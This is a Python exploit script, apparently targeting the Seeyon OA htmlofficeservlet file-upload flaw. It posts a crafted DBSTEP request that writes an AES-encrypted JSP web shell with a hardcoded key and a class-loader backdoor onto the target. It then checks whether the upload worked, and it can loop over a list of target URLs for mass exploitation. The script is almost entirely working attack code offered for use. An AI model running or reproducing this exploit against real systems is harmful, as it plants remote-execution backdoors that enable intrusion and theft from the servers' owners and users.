import argparse
import base64
import subprocess
import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
seeyon htmlofficeservlet upload!!!
''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    parser.add_argument('-n','--name',help="please input shell name")
    args = parser.parse_args()
    if args.name is  None or args.url is None or args.name is None:
        print(parser.print_help())
        exit()
    else:
        return args

def encode(file_name):
    name = ''
    a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    b = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    popen = subprocess.Popen(['java','-jar','seeyon-1.0-SNAPSHOT.jar',file_name],stdout=subprocess.PIPE)
    result=popen.stdout.read()
    for i in result[:-2].decode():
        name += b[a.index(i)]
    return name

def attack(url,shellname,shelladdress):
    reaurl = url + "seeyon/htmlofficeservlet"
    length = str(473 + len(shellname))
    payload = """DBSTEP V3.0     385             0               """ + length + """             DBSTEP=OKMLlKlV\r
    OPTION=S3WYOSWLBSGr\r
    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
    CREATEDATE=wUghPB3szB3Xwg66\r
    RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
    originalFileId=wV66\r
    originalCreateDate=wUghPB3szB3Xwg66\r
    FILENAME=""" + shellname + """\r
    needReadFile=yRWZdAS6\r
    originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>6e4f045d4b8506bf492ada7e3390d7ce"""
    headers = {
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
        "User - Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/92.0.4515.159 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "close"
    }
    response = requests.post(url=reaurl, data=payload, headers=headers)
    response2 = requests.get(url=url + 'seeyon/'+shelladdress)
    if '6e' in response2.text:
        print(url + 'seeyon/'+shelladdress+' shell upload success!!!')
    else:
        print('fail')
def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[:-1]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
  _____ _   ___      _______       ___   ___  __  ___        __  ___ ___   ___   ___  
 / ____| \ | \ \    / /  __ \     |__ \ / _ \/_ |/ _ \      /_ |/ _ \__ \ / _ \ / _ \ 
| |    |  \| |\ \  / /| |  | |______ ) | | | || | (_) |______| | (_) | ) | (_) | (_) |
| |    | . ` | \ \/ / | |  | |______/ /| | | || |\__, |______| |\__, |/ / \__, |\__, |
| |____| |\  |  \  /  | |__| |     / /_| |_| || |  / /       | |  / // /_   / /   / / 
 \_____|_| \_|   \/   |_____/     |____|\___/ |_| /_/        |_| /_/|____| /_/   /_/  

    """
    print(img)
    args = Args()
    shellname = encode(args.name)
    if args.url is not None and args.file is None:
        if '/' == args.url[:-1]:
            args.url = args.url
        else:
            args.url = args.url + '/'
        attack(args.url,shellname,args.name)
    elif args.url is None and args.file is not None:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i,shellname,args.name)
if __name__ =="__main__":
    main()

